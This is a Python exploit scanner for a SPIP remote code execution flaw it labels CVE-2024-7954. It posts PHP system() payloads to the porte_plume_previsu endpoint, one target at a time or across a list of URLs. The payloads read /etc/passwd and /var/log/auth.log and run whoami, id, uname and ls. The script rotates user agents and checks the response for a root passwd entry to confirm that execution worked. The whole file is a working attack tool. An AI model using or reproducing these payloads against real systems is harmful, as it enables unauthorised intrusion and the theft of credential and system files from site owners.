import re
import random
import requests
import argparse
from urllib.parse import urlparse
from termcolor import colored

# List of user agents to rotate through
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
]

# Payloads for CVE-2024-7954
payloads = [
    "data=AA_[<img111111>->URL`<?php system('cat /etc/passwd'); ?>`]_BB",  # Read passwd
    "data=AA_[<img111111>->URL`<?php system('whoami'); ?>`]_BB",           # Get current user
    "data=AA_[<img111111>->URL`<?php system('uname -a'); ?>`]_BB",         # Get system info
    "data=AA_[<img111111>->URL`<?php system('id'); ?>`]_BB",               # Get user ID
    "data=AA_[<img111111>->URL`<?php system('ls -la'); ?>`]_BB",           # List directory
    "data=AA_[<img111111>->URL`<?php system('cat /var/log/auth.log'); ?>`]_BB",  # Read auth log
]

# Function to check vulnerability
def check_vulnerability(target_url):
    parsed_url = urlparse(target_url)
    url = f"{parsed_url.scheme}://{parsed_url.netloc}/index.php?action=porte_plume_previsu"
    headers = {
        "User-Agent": random.choice(user_agents),
        "Content-Type": "application/x-www-form-urlencoded",
    }

    for payload in payloads:
        try:
            # Send the POST request with payload
            response = requests.post(url, headers=headers, data=payload, timeout=10)

            # Check for the vulnerability based on status code, regex in body, and server header
            if (
                response.status_code == 200
                and re.search(r'root:.*:0:0:', response.text)  # Regex to match root passwd entry
                and 'Composed-By: SPIP' in response.headers.get("Server", "")
            ):
                print(colored(f"[+] {target_url} is vulnerable to CVE-2024-7954!", "red"))
                print(colored(f"    Payload: {payload}", "yellow"))
            else:
                print(colored(f"[-] {target_url} is not vulnerable.", "red"))
        except requests.RequestException as e:
            print(colored(f"[!] Error scanning {target_url}: {str(e)}", "yellow"))

# Main function to handle arguments and target URL or file
def main():
    parser = argparse.ArgumentParser(description="Scan for CVE-2024-7954 vulnerability")
    parser.add_argument("-t", "--target", help="Target URL with protocol (e.g., http://example.com)")
    parser.add_argument("-f", "--file", help="File containing list of URLs")
    args = parser.parse_args()

    if args.target:
        check_vulnerability(args.target)
    elif args.file:
        try:
            with open(args.file, "r") as file:
                hosts = [line.strip() for line in file.readlines()]
                for host in hosts:
                    check_vulnerability(host)
        except FileNotFoundError:
            print(colored(f"[!] File '{args.file}' not found.", "yellow"))
    else:
        print(colored("[!] Please specify a target URL or file using -t or -f.", "yellow"))
        parser.print_help()

if __name__ == "__main__":
    main()
